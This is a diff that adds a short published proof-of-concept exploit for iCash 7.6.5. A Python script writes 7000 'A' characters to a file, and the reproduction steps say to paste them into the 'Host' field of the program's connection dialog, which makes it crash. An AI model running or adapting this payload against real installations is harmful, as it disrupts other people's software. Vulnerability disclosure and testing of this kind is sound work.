@@ -1,0 +1,25 @@
+# Exploit Title: iCash 7.6.5 - Denial of Service (PoC)
+# Author: Gionathan "John" Reale
+# Discovey Date: 2018-09-12
+# Software Link: https://www.maxprog.com/site/misc/downloads_us.php
+# Tested Version: 7.6.5
+# Tested on OS: Windows 7 32-bit
+# Steps to Reproduce: Run the python exploit script, it will create a new 
+# file with the name "exploit.txt". Copy the content from "exploit.txt".
+# Now start the program. When inside the program click "File" > "Connect to Server..."
+# Now paste the contents of "exploit.txt" into the fields:"Host"
+# Click the "Connect" button and you will see a crash!  
+
+#!/usr/bin/python
+   
+buffer = "A" * 7000
+
+payload = buffer
+try:
+    f=open("exploit.txt","w")
+    print "[+] Creating %s bytes evil payload.." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created"
